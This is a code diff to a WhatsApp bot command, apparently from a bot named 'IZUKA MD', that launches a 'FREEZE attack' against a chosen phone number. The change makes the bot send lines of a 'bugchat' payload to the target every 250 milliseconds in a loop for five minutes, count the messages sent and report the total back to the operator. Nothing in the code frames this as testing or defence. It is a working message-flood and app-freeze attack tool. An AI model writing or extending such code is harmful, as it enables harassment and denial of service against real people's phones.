@@ -57,25 +57,28 @@ cmd({
     const targetJid = `${targetNumber}@s.whatsapp.net`;
 
     await bot.sendMessage(from, {
-      text: `❄️ FREEZE attack launching on +${targetNumber}...`
+      text: `❄️ *FREEZE ATTACK LAUNCHING*\n📲 Target: +${targetNumber}\n🕒 Duration: 5 minutes`
     }, { quoted: mek });
 
     const lines = bugchat.split('\n').filter(Boolean);
+    const startTime = Date.now();
+    let count = 0;
 
-    for (let i = 0; i < lines.length; i++) {
-      await bot.sendMessage(targetJid, {
-        text: `☃️ FREEZE ATTACK #${i + 1}\n${lines[i]}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~IZUKA MD~`
-      });
-      await new Promise(resolve => setTimeout(resolve, 250)); // Delay ant mesaj
+    while (Date.now() - startTime < 5 * 60 * 1000) { // 5 minit
+      for (let line of lines) {
+        await bot.sendMessage(targetJid, {
+          text: `☃️ *FREEZE ATTACK #${++count}*\n${line}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~IZUKA MD~`
+        });
+        await new Promise(resolve => setTimeout(resolve, 250));
+      }
     }
 
-    // ✅ Notifikasyon final pou target la tou
     await bot.sendMessage(targetJid, {
-      text: `✅ *FREEZE COMPLETED*\n🔚 System freeze sent successfully.\n~IZUKA MD~`
+      text: `✅ *FREEZE COMPLETED*\n🧊 Total Payloads Sent: ${count}\n~IZUKA MD~`
     });
 
     await bot.sendMessage(from, {
-      text: `✅ FREEZE attack sent successfully to +${targetNumber}.`
+      text: `✅ *FREEZE attack finished*\n🕔 Ran for 5 minutes\n📤 Messages sent: ${count}\n🎯 Target: +${targetNumber}`
     }, { quoted: mek });
 
   } catch (error) {
